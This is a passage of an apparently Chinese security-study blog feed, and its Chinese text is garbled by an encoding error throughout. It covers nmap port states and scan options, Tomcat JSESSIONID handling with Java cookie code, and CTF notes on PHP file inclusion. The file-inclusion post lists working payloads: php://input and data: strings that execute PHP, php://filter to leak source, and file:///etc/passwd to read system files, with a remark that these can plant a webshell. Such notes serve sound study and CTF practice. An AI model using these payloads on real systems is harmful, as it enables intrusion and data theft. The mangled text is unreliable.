æ³•åˆ°è¾¾ç›®æ ‡: é€šä¿¡è¢«ç®¡ç†å‘˜ç¦æ­¢)ï¼Œä½†æ›´æ™®éçš„æ˜¯è¿‡æ»¤å™¨åªæ˜¯ä¸¢å¼ƒæ¢æµ‹å¸§ï¼Œ ä¸åšä»»ä½•å“åº”ã€‚ è¿™è¿«ä½¿Nmapé‡è¯•è‹¥å¹²æ¬¡ä»¥è®¿ä¸‡ä¸€æ¢æµ‹åŒ…æ˜¯ç”±äºç½‘ç»œé˜»å¡ä¸¢å¼ƒçš„ã€‚ è¿™ä½¿å¾—æ‰«æé€Ÿåº¦æ˜æ˜¾å˜æ…¢ã€‚</p></blockquote><blockquote><p>unfiltered(æœªè¢«è¿‡æ»¤çš„)<br>æœªè¢«è¿‡æ»¤çŠ¶æ€æ„å‘³ç€ç«¯å£å¯è®¿é—®ï¼Œä½†Nmapä¸èƒ½ç¡®å®šå®ƒæ˜¯å¼€æ”¾è¿˜æ˜¯å…³é—­ã€‚ åªæœ‰ç”¨äºæ˜ å°„é˜²ç«å¢™è§„åˆ™é›†çš„ACKæ‰«ææ‰ä¼šæŠŠç«¯å£åˆ†ç±»åˆ°è¿™ç§çŠ¶æ€ã€‚ ç”¨å…¶å®ƒç±»å‹çš„æ‰«æå¦‚çª—å£æ‰«æï¼ŒSYNæ‰«æï¼Œæˆ–è€…FINæ‰«ææ¥æ‰«ææœªè¢«è¿‡æ»¤çš„ç«¯å£å¯ä»¥å¸®åŠ©ç¡®å®š ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</p></blockquote><blockquote><p>open|filtered(å¼€æ”¾æˆ–è€…è¢«è¿‡æ»¤çš„)<br>å½“æ— æ³•ç¡®å®šç«¯å£æ˜¯å¼€æ”¾è¿˜æ˜¯è¢«è¿‡æ»¤çš„ï¼ŒNmapå°±æŠŠè¯¥ç«¯å£åˆ’åˆ†æˆ è¿™ç§çŠ¶æ€ã€‚å¼€æ”¾çš„ç«¯å£ä¸å“åº”å°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚æ²¡æœ‰å“åº”ä¹Ÿå¯èƒ½æ„å‘³ç€æŠ¥æ–‡è¿‡æ»¤å™¨ä¸¢å¼ƒ äº†æ¢æµ‹æŠ¥æ–‡æˆ–è€…å®ƒå¼•å‘çš„ä»»ä½•å“åº”ã€‚å› æ­¤Nmapæ— æ³•ç¡®å®šè¯¥ç«¯å£æ˜¯å¼€æ”¾çš„è¿˜æ˜¯è¢«è¿‡æ»¤çš„ã€‚ UDPï¼ŒIPåè®®ï¼Œ FINï¼ŒNullï¼Œå’ŒXmasæ‰«æå¯èƒ½æŠŠç«¯å£å½’å…¥æ­¤ç±»ã€‚</p></blockquote><blockquote><p>closed|filtered(å…³é—­æˆ–è€…è¢«è¿‡æ»¤çš„)<br>è¯¥çŠ¶æ€ç”¨äºNmapä¸èƒ½ç¡®å®šç«¯å£æ˜¯å…³é—­çš„è¿˜æ˜¯è¢«è¿‡æ»¤çš„ã€‚ å®ƒåªå¯èƒ½å‡ºç°åœ¨IPID Idleæ‰«æä¸­ã€‚</p></blockquote><h5 id="3-2-1-ç«¯å£æ‰«æ"><a href="#3-2-1-ç«¯å£æ‰«æ" class="headerlink" title="3.2.1 ç«¯å£æ‰«æ"></a>3.2.1 ç«¯å£æ‰«æ</h5><blockquote><p>nmap ip -p ç«¯å£å·  </p></blockquote><p>æ‰«æã€ŒæŒ‡å®šç«¯å£ã€ï¼Œä½¿ç”¨ -p å‚æ•°ï¼Œå¯ä»¥ä¸€æ¬¡æ‰«æå•ä¸ªç«¯å£ã€å¤šä¸ªç«¯å£ã€æˆ–æ‰«æä¸€ä¸ªèŒƒå›´çš„ç«¯å£</p><h5 id="ç«¯å£èŒƒå›´æ‰«æ"><a href="#ç«¯å£èŒƒå›´æ‰«æ" class="headerlink" title="ç«¯å£èŒƒå›´æ‰«æ"></a>ç«¯å£èŒƒå›´æ‰«æ</h5><blockquote><p>nmap ip -p èŒƒå›´  </p></blockquote><h4 id="3-3-æœåŠ¡"><a href="#3-3-æœåŠ¡" class="headerlink" title="3.3 æœåŠ¡"></a>3.3 æœåŠ¡</h4><h5 id="3-3-1-è¯†åˆ«æœåŠ¡ç‰ˆæœ¬"><a href="#3-3-1-è¯†åˆ«æœåŠ¡ç‰ˆæœ¬" class="headerlink" title="3.3.1 è¯†åˆ«æœåŠ¡ç‰ˆæœ¬"></a>3.3.1 è¯†åˆ«æœåŠ¡ç‰ˆæœ¬</h5><blockquote><p>nmap -sV ip -p ç«¯å£å·æˆ–èŒƒå›´ </p></blockquote><p>æƒ³è¦è¯†åˆ«å…·ä½“çš„ã€ŒæœåŠ¡ç‰ˆæœ¬ã€ï¼Œå¯ä»¥ä½¿ç”¨ -sV å‚æ•°ã€‚</p><h4 id="3-4-ç³»ç»Ÿ"><a href="#3-4-ç³»ç»Ÿ" class="headerlink" title="3.4 ç³»ç»Ÿ"></a>3.4 ç³»ç»Ÿ</h4><h5 id="3-4-1-è¯†åˆ«æ“ä½œç³»ç»Ÿ"><a href="#3-4-1-è¯†åˆ«æ“ä½œç³»ç»Ÿ" class="headerlink" title="3.4.1 è¯†åˆ«æ“ä½œç³»ç»Ÿ"></a>3.4.1 è¯†åˆ«æ“ä½œç³»ç»Ÿ</h5><blockquote><p>nmap -O ip  </p></blockquote><p>æƒ³è¦è¯†åˆ«ã€Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€ï¼Œå¯ä»¥ä½¿ç”¨ -O å‚æ•°ï¼ˆéœ€è¦ root æƒé™ï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>Tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-9484-tomcat-sessionæŒä¹…åŒ–</title>
    <link href="/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <url>/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.secpulse.com/archives/163637.html">CVE</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsessionidæ˜¯ä»€ä¹ˆï¼Ÿ</title>
    <link href="/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
    <url>/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰ä¸æ˜¯å†™äº†ä¸€ä¸ªçˆ¬æ•°æ®çš„è„šæœ¬ä¹ˆï¼Œä»Šå¤©å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯jsessonidåœ¨åˆ·æ–°ä¹‹åå˜äº†ï¼Œæ‰€ä»¥æˆ‘ç°åœ¨æƒ³è¦æ‰¾åˆ°ä¸€ä¸ªä¸ä¼šå˜çš„æ–¹æ³•ï¼Œä¸è¿‡è¿™ä¸ªä¿®æ”¹å’Œå­¦ä¹ æ—¶é—´åº”è¯¥ä¼šå˜å¾—æ¯”è¾ƒä¹…ï¼Œæ„Ÿè§‰æŒºé«˜é˜¶çš„</p><p>çœ‹äº†ä¸€äº›æ–‡ç« å°†çš„éƒ½æ˜¯tomcatçš„çš„ä¾‹å­ï¼Œå…ˆè®²è®²ä»€ä¹ˆæ˜¯sessionï¼Œæµè§ˆå™¨ç¬¬ä¸€æ¬¡è®¿é—®æœåŠ¡å™¨ä¼šç”Ÿæˆä¸€ä¸ªsessionä¿å­˜ç›¸å…³ä¿¡æ¯ï¼Œä¼šæœ‰ä¸€ä¸ªsessionidæ¥å¯¹åº”è¿™ä¸ªsessionï¼Œ<strong>é‚£ä¹ˆæˆ‘ä»¬å°±æƒ³å¯ä¸å¯ä»¥åˆ©ç”¨è¿™ä¸ªidç›´æ¥å»æŸ¥sessionçš„å€¼</strong>  </p><p>tomcatçš„StandardManagerç±»å°†sessionå­˜å‚¨åœ¨å†…å­˜ä¸­ä¹Ÿå¯ä»¥æŒä¹…åŒ–åˆ°æ–‡ä»¶ä¸­ï¼Œsessionidæ˜¯ä¸€ä¸ªæŒ‡ä»£sessionåœ¨æœåŠ¡å™¨ç«¯ä½ç½®çš„å€¼ï¼Œå­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„cookieä¸Šï¼Œä¸ä¼šå°†sessionä¿å­˜åœ¨æœ¬åœ°,sessionä¹Ÿåªèƒ½é€šè¿‡invalidateæˆ–è¶…æ—¶æ¥é”€æ¯</p><blockquote><p>é‚£ä¹ˆSessionåœ¨ä½•æ—¶åˆ›å»ºå‘¢ï¼Ÿå½“ç„¶è¿˜æ˜¯åœ¨æœåŠ¡å™¨ç«¯ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­åˆ›å»ºçš„ï¼Œä¸åŒè¯­è¨€å®ç°çš„åº”ç”¨ç¨‹åºæœ‰ä¸åŒåˆ›å»ºSessionçš„æ–¹æ³•ï¼Œè€Œåœ¨Javaä¸­æ˜¯é€šè¿‡è°ƒç”¨HttpServletRequestçš„getSessionæ–¹æ³•ï¼ˆä½¿ç”¨trueä½œä¸ºå‚æ•°ï¼‰åˆ›å»ºçš„ã€‚åœ¨åˆ›å»ºäº†Sessionçš„åŒæ—¶ï¼ŒæœåŠ¡å™¨ä¼šä¸ºè¯¥Sessionç”Ÿæˆå”¯ä¸€çš„Session idï¼Œè€Œè¿™ä¸ªSession idåœ¨éšåçš„è¯·æ±‚ä¸­ä¼šè¢«ç”¨æ¥é‡æ–°è·å¾—å·²ç»åˆ›å»ºçš„Sessionï¼›åœ¨Sessionè¢«åˆ›å»ºä¹‹åï¼Œå°±å¯ä»¥è°ƒç”¨Sessionç›¸å…³çš„æ–¹æ³•å¾€Sessionä¸­å¢åŠ å†…å®¹äº†ï¼Œè€Œè¿™äº›å†…å®¹åªä¼šä¿å­˜åœ¨æœåŠ¡å™¨ä¸­ï¼Œå‘åˆ°å®¢æˆ·ç«¯çš„åªæœ‰Session idï¼›å½“å®¢æˆ·ç«¯å†æ¬¡å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šå°†è¿™ä¸ªSession idå¸¦ä¸Šï¼ŒæœåŠ¡å™¨æ¥å—åˆ°è¯·æ±‚ä¹‹åå°±ä¼šä¾æ®Session idæ‰¾åˆ°ç›¸åº”çš„Sessionï¼Œä»è€Œå†æ¬¡ä½¿ç”¨ä¹‹ã€‚</p></blockquote><p>åˆ›å»ºï¼šsessionidç¬¬ä¸€æ¬¡äº§ç”Ÿæ˜¯åœ¨ç›´åˆ°æŸserverç«¯ç¨‹åºè°ƒç”¨ HttpServletRequest.getSession(true)è¿™æ ·çš„è¯­å¥æ—¶æ‰è¢«åˆ›å»ºã€‚</p><p>åˆ é™¤ï¼šè¶…æ—¶ï¼›ç¨‹åºè°ƒç”¨HttpSession.invalidate()ï¼›ç¨‹åºå…³é—­ï¼›</p><p>sessionå­˜æ”¾åœ¨å“ªé‡Œï¼šæœåŠ¡å™¨ç«¯çš„å†…å­˜ä¸­ã€‚ä¸è¿‡sessionå¯ä»¥é€šè¿‡ç‰¹æ®Šçš„æ–¹å¼åšæŒä¹…åŒ–ç®¡ç†ï¼ˆmemcacheï¼Œredisï¼‰ã€‚</p><p>sessionçš„idæ˜¯ä»å“ªé‡Œæ¥çš„ï¼ŒsessionIDæ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼šå½“å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚sessionå¯¹è±¡æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¼šä¸ºå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªsessionï¼Œå¹¶å°†é€šè¿‡ç‰¹æ®Šç®—æ³•ç®—å‡ºä¸€ä¸ªsessionçš„IDï¼Œç”¨æ¥æ ‡è¯†è¯¥sessionå¯¹è±¡</p><p>sessionä¼šå› ä¸ºæµè§ˆå™¨çš„å…³é—­è€Œåˆ é™¤å—ï¼Ÿ<br>ä¸ä¼šï¼Œsessionåªä¼šé€šè¿‡ä¸Šé¢æåˆ°çš„æ–¹å¼å»å…³é—­ã€‚</p><p>ä¸‹é¢æ˜¯tomcatä¸­sessionçš„åˆ›å»ºï¼š</p><blockquote><p>ManagerBaseæ˜¯æ‰€æœ‰sessionç®¡ç†å·¥å…·ç±»çš„åŸºç±»ï¼Œå®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€æœ‰å…·ä½“å®ç°sessionç®¡ç†åŠŸèƒ½çš„ç±»éƒ½è¦ç»§æ‰¿è¿™ä¸ªç±»ï¼Œè¯¥ç±»æœ‰ä¸€ä¸ªå—ä¿æŠ¤çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°±æ˜¯åˆ›å»ºsessionIdå€¼çš„æ–¹æ³•ï¼š<br>ï¼ˆ tomcatçš„sessionçš„idå€¼ç”Ÿæˆçš„æœºåˆ¶æ˜¯ä¸€ä¸ªéšæœºæ•°åŠ æ—¶é—´åŠ ä¸Šjvmçš„idå€¼ï¼Œjvmçš„idå€¼ä¼šæ ¹æ®æœåŠ¡å™¨çš„ç¡¬ä»¶ä¿¡æ¯è®¡ç®—å¾—æ¥ï¼Œå› æ­¤ä¸åŒjvmçš„idå€¼éƒ½æ˜¯å”¯ä¸€çš„ï¼‰ï¼Œ<br>StandardManagerç±»æ˜¯tomcatå®¹å™¨é‡Œé»˜è®¤çš„sessionç®¡ç†å®ç°ç±»ï¼Œ<br>å®ƒä¼šå°†sessionçš„ä¿¡æ¯å­˜å‚¨åˆ°webå®¹å™¨æ‰€åœ¨æœåŠ¡å™¨çš„å†…å­˜é‡Œã€‚<br>PersistentManagerBaseä¹Ÿæ˜¯ç»§æ‰¿ManagerBaseç±»ï¼Œå®ƒæ˜¯æ‰€æœ‰æŒä¹…åŒ–å­˜å‚¨sessionä¿¡æ¯çš„åŸºç±»ï¼ŒPersistentManagerç»§æ‰¿äº†PersistentManagerBaseï¼Œä½†æ˜¯è¿™ä¸ªç±»åªæ˜¯å¤šäº†ä¸€ä¸ªé™æ€å˜é‡å’Œä¸€ä¸ªgetNameæ–¹æ³•ï¼Œç›®å‰çœ‹æ¥æ„ä¹‰ä¸å¤§ï¼Œ å¯¹äºæŒä¹…åŒ–å­˜å‚¨sessionï¼Œtomcatè¿˜æä¾›äº†StoreBaseçš„æŠ½è±¡ç±»ï¼Œå®ƒæ˜¯æ‰€æœ‰æŒä¹…åŒ–å­˜å‚¨sessionçš„åŸºç±»ï¼Œå¦å¤–tomcatè¿˜ç»™å‡ºäº†æ–‡ä»¶å­˜å‚¨FileStoreå’Œæ•°æ®å­˜å‚¨JDBCStoreä¸¤ä¸ªå®ç°ã€‚</p></blockquote><p>æ‰€ä»¥ä¼šå‡ºç°ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š</p><blockquote><p>1ã€serveræ²¡æœ‰å…³é—­ï¼Œå¹¶åœ¨sessionå¯¹è±¡é”€æ¯æ—¶é—´å†…ï¼Œå½“å®¢æˆ·ç«¯å†æ¬¡æ¥è¯·æ±‚serveç«¯çš„servletæˆ–jspæ—¶ï¼Œå°†ä¼šæŠŠå°†ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥serveæ—¶ç”Ÿæˆçš„sessionidå¸¦åˆ°è¯·æ±‚å¤´ä¸Šå‘serverç«¯å‘é€ï¼Œserverç«¯æ”¶åˆ°sessionidåæ ¹æ®æ­¤sessionidä¼šå»æœç´¢serverå¯¹åº”çš„sessionå¯¹è±¡å¹¶ç›´æ¥è¿”å›è¿™ä¸ªsessionå¯¹è±¡ï¼Œæ­¤æ—¶ä¸ä¼šé‡æ–°åˆ›å»ºsessionå¯¹è±¡ã€‚<br>2ã€å½“serverå…³é—­ï¼ˆä¹‹å‰äº§ç”Ÿçš„sessionå¯¹è±¡ä¹Ÿå°±æ¶ˆäº¡äº†ï¼‰ï¼Œæˆ–è€…sessionå¯¹è±¡è¿‡äº†é”€æ¯æ—¶é—´ï¼Œæµè§ˆå™¨çª—å£æ²¡æœ‰å…³é—­ï¼Œå¹¶åœ¨æœ¬çª—å£ç»§ç»­è¯·æ±‚serverç«¯çš„servletæˆ–è€…jspæ—¶ï¼Œæ­¤æ—¶åŒæ ·ä¼šå°†sessionid å‘é€åˆ° æœåŠ¡ç«¯ï¼Œserveræ‹¿ç€idå»æ‰¾å¯¹åº”çš„sessionå¯¹è±¡ï¼›ä½†æ˜¯æ­¤æ—¶sessionå¯¹è±¡å·²ç»ä¸å­˜åœ¨äº†ã€‚æ‰€ä»¥ä¼šé‡æ–°ç”Ÿæˆä¸€ä¸ªsessionå’Œå¯¹åº”çš„sessionid ï¼Œå°†è¿™ä¸ªæ–°çš„idä»¥å“åº”æŠ¥æ–‡çš„å½¢å¼å‘åˆ°æµè§ˆå™¨çš„å†…æ ¸ä¸­ï¼Œé‡æ–°æ›´æ–°cookieã€‚<br>3ã€å½“serveræ²¡æœ‰å…³é—­ï¼Œå¹¶ä¸”sessionå¯¹è±¡åœ¨å…¶é”€æ¯æ—¶é—´å†…ï¼Œå½“è¯·æ±‚ä¸€ä¸ªjspé¡µé¢è¿”å›å®¢æˆ·ç«¯åï¼Œå…³é—­æ­¤æµè§ˆå™¨çª—å£ï¼Œæ­¤æ—¶å…¶å†…å­˜ä¸­çš„sessionidä¹Ÿå°±éšä¹‹é”€æ¯ã€‚åœ¨é‡æ–°å»è¯·æ±‚serverç«¯çš„servletæˆ–è€…jspæ—¶ï¼Œä¼šé‡æ–°ç”Ÿæˆä¸€ä¸ªsessionidç»™å®¢æˆ·ç«¯æµè§ˆå™¨ï¼Œå¹¶ä¸”å­˜åœ¨æµè§ˆå™¨å†…å­˜ä¸­ã€‚</p></blockquote><p>æˆ‘ä»¬ä½¿ç”¨çš„å…¶å®å°±æ˜¯å°†å·²ç»å­˜æ”¾çš„cookieæ¥é‡æ”¾è·å–å¯¹åº”çš„æ•°æ®ï¼Œä¸è¿‡åœ¨åˆ·æ–°è¿‡ååº”è¯¥ä¼šè°ƒç”¨HttpSession.invalidate()ï¼Œå¹¶åœ¨ä¸‹æ¬¡è¯·æ±‚æ—¶åˆ›å»ºä¸€ä¸ªæ–°çš„sessionæ¥è¿›è¡Œè®¿é—®ï¼Œæ‰€ä»¥è¦æ˜¯æƒ³æ”¹çš„çš„è¯è¦ä¹ˆå°±æ˜¯å¯¹åº”çš„æœåŠ¡å™¨ç«¯æœ‰sessionæŒç»­åŒ–ä¿å­˜æœºåˆ¶ï¼Œä¸ç„¶æˆ‘æ¯éš”ä¸¤å¤©å°±è¦æ‰‹åŠ¨æ›´æ–°sessionéš¾å—å“¦ï¼Œ&#x2F;(ã„’oã„’)&#x2F;~~</p><p><strong>cookieçš„ä¿å­˜æ–¹å¼æœ‰ä¸¤ç§ï¼š</strong><br>å¦‚æœæ²¡æœ‰è®¾ç½®cookieçš„å¤±æ•ˆæ—¶é—´ï¼Œè¿™ä¸ªcookieå°±å­˜åœ¨ä¸æµè§ˆå™¨è¿›ç¨‹ï¼›</p><p>è®¾ç½®äº†cookieçš„å¤±æ•ˆæ—¶é—´ï¼Œé‚£ä¹ˆè¿™ä¸ªcookieå°±å­˜åœ¨äºç¡¬ç›˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Cookieçš„ä¸€äº›åŸºæœ¬è®¾ç½®</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;Admin-Token&quot;</span>, token);<br><br>        Cookie[] cookie2 = request.getCookies();<br>        <span class="hljs-comment">//request.getContextPath()   mdrwebrest</span><br>        cookie.setPath(<span class="hljs-string">&quot;/&quot;</span>);        <span class="hljs-comment">//è®¾ç½®cookiesæœ‰æ•ˆè·¯å¾„</span><br>        <span class="hljs-comment">//è®¾ç½®cookieæœ‰æ•ˆæ—¶é—´  æ­£æ•°ï¼šå­˜åˆ°ç¡¬ç›˜ï¼Œè´Ÿæ•°å­˜åˆ°æµè§ˆå™¨ï¼Œ0ç«‹åˆ»é”€æ¯</span><br>        cookie.setMaxAge();      <br>        cookie.setDomain(loginToMDRConfig.getIP()); <span class="hljs-comment">//è·¨åŸŸ</span><br>        response.addCookie(cookie);<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯å®ç°æœºåˆ¶å›¾<br><img src="https://gitee.com/fogpost/photo/raw/master/202409161116311.png" srcset="/img/loading.gif" lazyload><br>æ–‡ç« ç»™å‡ºçš„è·å–sessionidæ–¹æ³•æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpSession session=request.getSession(); <span class="hljs-comment">//è·å–session</span><br>String sessionid=session.getId();  <span class="hljs-comment">//è·å–sessionid</span><br>Cookie cookie=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;JSESSIONID&quot;</span>,sessionid); <span class="hljs-comment">//æ‰‹åŠ¨è®¾ç½®ä¸€ä¸ªç¡¬ç›˜å­˜å‚¨COOKIEï¼Œè¿™ä¸ªcooikeæ—¶å­˜åœ¨ç¡¬ç›˜çš„ï¼Œä¸æ˜¯å­˜åœ¨æµè§ˆå™¨çº¿ç¨‹çš„</span><br>cookie.setMaxAge(<span class="hljs-number">30</span>*<span class="hljs-number">60</span>);<br>response.addCookie(cookie); <span class="hljs-comment">//å°†COOKIEè®¾ç½®åˆ°å“åº”ä¸Š</span><br></code></pre></td></tr></table></figure><p>å…¶å®æˆ‘ä»¬å¯ä»¥å‡å€ŸæœåŠ¡å™¨è‡ªå·±çš„æ‰‹ï¼Œé€šè¿‡burpæŠ“åŒ…æ¥å®ç°è·å–å¯¹åº”çš„sessionidï¼Œè¿›ä¸€æ­¥è·å–å¯¹åº”æŠ¥æ–‡(è¿™ä¸å°±æ˜¯æˆ‘ä¹‹å‰å¹²è¿‡çš„ä¹ˆï¼Œç°åœ¨å­¦äº†ä¸€éåŸç†ï¼ŒğŸ‘¿æˆ‘äº†)</p><p><a href="https://www.cnblogs.com/Timeouting-Study/p/16082575.html">jsessionid</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>session</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2024/09/16/SSRF/"/>
    <url>/2024/09/16/SSRF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/2288231">web</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¼ªåè®®ä¸æ–‡ä»¶åŒ…å«</title>
    <link href="/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h3 id="å‰ç½®å­¦ä¹ è¦æ±‚"><a href="#å‰ç½®å­¦ä¹ è¦æ±‚" class="headerlink" title="å‰ç½®å­¦ä¹ è¦æ±‚"></a>å‰ç½®å­¦ä¹ è¦æ±‚</h3><h4 id="æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="æ–‡ä»¶åŒ…å«å‡½æ•°"></a>æ–‡ä»¶åŒ…å«å‡½æ•°</h4><blockquote><p>æ–‡ä»¶åŒ…å«æ‰€å¯èƒ½æœ‰çš„å‡½æ•°<br>phpå½“ä¸­ä¼šé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´çš„å‡½æ•°æœ‰ï¼šincludeã€requireã€include_onceã€require_onceã€highlight_file ã€show_source ã€readfile ã€file_get_contents ã€fopen ã€file<br>å®ç°æ–¹æ³•</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span> ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#GETæ•°æ®</span><br><span class="hljs-number">2</span> ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  <span class="hljs-comment">#åé¢çš„base64å­—ç¬¦æ˜¯éœ€è¦ä¼ å…¥çš„å­—ç¬¦ä¸²çš„base64ç¼–ç </span><br><span class="hljs-number">3</span> ?file=php:<span class="hljs-comment">//input [POST DATA:]&lt;?php phpinfo()?&gt;  #POSTæ•°æ®</span><br><span class="hljs-number">4</span> ?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=xxx.php  #getè¯»æºç </span><br></code></pre></td></tr></table></figure><h4 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h4><blockquote><p>éœ€è¦å¼€å¯allow_url_fopençš„ï¼šphp:&#x2F;&#x2F;inputã€php:&#x2F;&#x2F;stdinã€php:&#x2F;&#x2F;memoryå’Œphp:&#x2F;&#x2F;temp<br>ä¸éœ€è¦å¼€å¯allow_wrl_fopençš„ï¼šphp:&#x2F;&#x2F;filter<br>åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php:&#x2F;&#x2F;filterå’Œphp:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filterç”¨äºè¯»å–æºç ï¼Œphp:&#x2F;&#x2F;inputç”¨äºæ‰§è¡Œphpä»£ç <br>php:&#x2F;&#x2F;inputéœ€è¦postè¯·æ±‚æäº¤æ•°æ®<br>php:&#x2F;&#x2F;filterå¯ä»¥getæäº¤?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p></blockquote><h4 id="dataä¼ªåè®®"><a href="#dataä¼ªåè®®" class="headerlink" title="dataä¼ªåè®®"></a>dataä¼ªåè®®</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?xxx=data:<span class="hljs-comment">//text/plain;base64,æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç </span><br>?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="fileåè®®"><a href="#fileåè®®" class="headerlink" title="fileåè®®"></a>fileåè®®</h4><blockquote><p>File:&#x2F;&#x2F; è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ<br>file:&#x2F;&#x2F; ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¦‚c:ç›˜ä¸­çš„ä¸œè¥¿ã€‚åœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚<br>file:&#x2F;&#x2F; [æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]<br>linux ç³»ç»Ÿç¯å¢ƒä¸‹ï¼š?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>winows ç³»ç»Ÿç¯å¢ƒä¸‹ï¼š?file&#x3D;file:&#x2F;&#x2F;&#x2F;E:\phpStudy\WWW\code\phpinfo.php</p></blockquote><p>æ€»ç»“ï¼šFileåè®®ç”¨äºè¯»å–ç³»ç»Ÿæ–‡ä»¶ï¼Œcç›˜å…³é”®å†…å®¹ã€‚Php:&#x2F;&#x2F;filter ç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œä½†æ˜¯è¦base64åå‡ºæ¥ï¼Œå¦åˆ™ä¼šé€ æˆæ–‡ä»¶æ‰§è¡Œä»è€Œåªçœ‹åˆ°æ‰§è¡Œç»“æœã€‚Php:&#x2F;&#x2F;inputï¼ˆä»£ç æ‰§è¡Œï¼‰å¯å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å¯ä»¥ç”¨äºå†™æœ¨é©¬ã€‚Dataå’Œinputç›¸ä¼¼ï¼Œå¯ä»¥ä»£ç æ‰§è¡Œï¼Œä½†åªæœ‰åœ¨php&lt;5.3ä¸”include&#x3D;onæ—¶å¯ä»¥å†™æœ¨é©¬ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
